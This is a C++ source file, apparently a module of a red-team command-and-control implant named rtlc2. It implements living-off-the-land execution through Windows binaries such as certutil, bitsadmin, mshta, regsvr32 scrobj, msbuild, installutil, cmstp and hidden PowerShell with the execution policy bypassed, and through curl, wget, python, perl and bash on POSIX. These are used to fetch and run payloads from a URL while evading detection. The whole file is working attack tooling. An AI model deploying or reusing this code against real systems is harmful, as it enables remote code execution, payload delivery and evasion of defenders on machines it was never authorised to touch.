// LOLBAS / GTFOBins - Living-Off-The-Land execution methods
// Uses legitimate system binaries for execution and download
#include "agent.h"
#include <cstring>
#include <string>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#endif

namespace rtlc2 {
namespace modules {

// Helper: execute command and capture output
static std::string RunCommand(const std::string& cmd) {
#ifdef RTLC2_WINDOWS
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return "Failed to create pipe";

    STARTUPINFOA si = { sizeof(si) };
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags = STARTF_USESTDHANDLES;

    PROCESS_INFORMATION pi = {};
    char cmdBuf[4096];
    snprintf(cmdBuf, sizeof(cmdBuf), "cmd.exe /c %s", cmd.c_str());

    if (!CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "CreateProcess failed: " + std::to_string(GetLastError());
    }

    CloseHandle(hWritePipe);

    std::string output;
    char buf[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        output += buf;
    }

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return output;
#else
    // POSIX
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "popen failed";

    std::string output;
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp)) output += buf;
    pclose(fp);
    return output;
#endif
}

std::string LOLBASExec(const std::string& method, const std::string& args) {
#ifdef RTLC2_WINDOWS
    if (method == "certutil") {
        // certutil -urlcache -split -f <url> <outfile>
        return RunCommand("certutil -urlcache -split -f " + args);
    }
    if (method == "bitsadmin") {
        // bitsadmin /transfer job /download /priority high <url> <outfile>
        return RunCommand("bitsadmin /transfer rtl /download /priority high " + args);
    }
    if (method == "mshta") {
        // mshta <url> or mshta vbscript:Execute(...)
        return RunCommand("mshta " + args);
    }
    if (method == "rundll32") {
        return RunCommand("rundll32 " + args);
    }
    if (method == "regsvr32") {
        // regsvr32 /s /n /u /i:<url> scrobj.dll
        return RunCommand("regsvr32 /s /n /u /i:" + args + " scrobj.dll");
    }
    if (method == "wmic") {
        return RunCommand("wmic process call create \"" + args + "\"");
    }
    if (method == "msbuild") {
        return RunCommand("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe " + args);
    }
    if (method == "installutil") {
        return RunCommand("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U " + args);
    }
    if (method == "cmstp") {
        return RunCommand("cmstp /ni /s " + args);
    }
    if (method == "powershell") {
        return RunCommand("powershell -nop -w hidden -ep bypass -c " + args);
    }
#else
    // GTFOBins equivalents
    if (method == "curl") {
        return RunCommand("curl -s " + args);
    }
    if (method == "wget") {
        return RunCommand("wget -q -O- " + args);
    }
    if (method == "python") {
        return RunCommand("python3 -c '" + args + "'");
    }
    if (method == "perl") {
        return RunCommand("perl -e '" + args + "'");
    }
    if (method == "bash") {
        return RunCommand("bash -c '" + args + "'");
    }
#endif

    return "Unknown method: " + method + "\n"
#ifdef RTLC2_WINDOWS
           "Available: certutil, bitsadmin, mshta, rundll32, regsvr32, wmic, "
           "msbuild, installutil, cmstp, powershell";
#else
           "Available: curl, wget, python, perl, bash";
#endif
}

} // namespace modules
} // namespace rtlc2
